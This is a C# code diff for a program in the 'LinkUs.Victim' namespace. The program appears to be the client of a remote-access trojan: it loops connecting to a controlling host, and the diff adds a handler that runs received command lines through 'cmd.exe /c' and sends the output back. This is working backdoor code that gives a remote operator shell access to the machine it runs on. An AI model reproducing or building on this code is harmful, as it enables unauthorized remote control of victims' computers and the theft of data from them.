@@ -15,6 +15,7 @@ namespace LinkUs.Victim
 
         static void Main(string[] args)
         {
+            Thread.Sleep(1000);
             while (true) {
                 var connection = new SocketConnection();
                 if (TryConnectSocketToHost(connection)) {
@@ -60,20 +61,39 @@ namespace LinkUs.Victim
         {
             Console.WriteLine(package);
 
-            var command = Serializer.Deserialize<string>(package.Content);
-            if (command == "dir") {
-                Thread.Sleep(1000);
-                var packageResponse = package.CreateResponsePackage(Serializer.Serialize(Directory.GetCurrentDirectory()));
+            var command = Serializer.Deserialize<Command>(package.Content);
+            if (command.Name == "ExecuteRemoteCommandLine") {
+                var executeRemoteCommand = Serializer.Deserialize<ExecuteRemoteCommandLine>(package.Content);
+                var result = ExecuteBatch(executeRemoteCommand);
+                var packageResponse = package.CreateResponsePackage(Serializer.Serialize(result));
                 transmitter.Send(packageResponse);
             }
-            else if (command == "date") {
+            else if (command.Name == "date") {
                 var packageResponse = package.CreateResponsePackage(Serializer.Serialize(DateTime.Now.ToShortDateString()));
                 transmitter.Send(packageResponse);
             }
-            else if (command == "ping") {
+            else if (command.Name == "ping") {
                 var packageResponse = package.CreateResponsePackage(Serializer.Serialize("ok"));
                 transmitter.Send(packageResponse);
             }
+            else {
+                var packageResponse = package.CreateResponsePackage(Serializer.Serialize("unknown command"));
+                transmitter.Send(packageResponse);
+            }
+        }
+
+        private static object ExecuteBatch(ExecuteRemoteCommandLine executeRemoteCommand)
+        {
+            executeRemoteCommand.Arguments.Insert(0, executeRemoteCommand.CommandLine);
+            var proc = new System.Diagnostics.Process();
+            proc.StartInfo.FileName = "cmd.exe";
+            proc.StartInfo.Arguments = "/c " + string.Join(" ", executeRemoteCommand.Arguments);
+            proc.StartInfo.UseShellExecute = false;
+            proc.StartInfo.RedirectStandardOutput = true;
+            proc.Start();
+            var result = proc.StandardOutput.ReadToEnd();
+            proc.WaitForExit();
+            return result;
         }
     }
 }
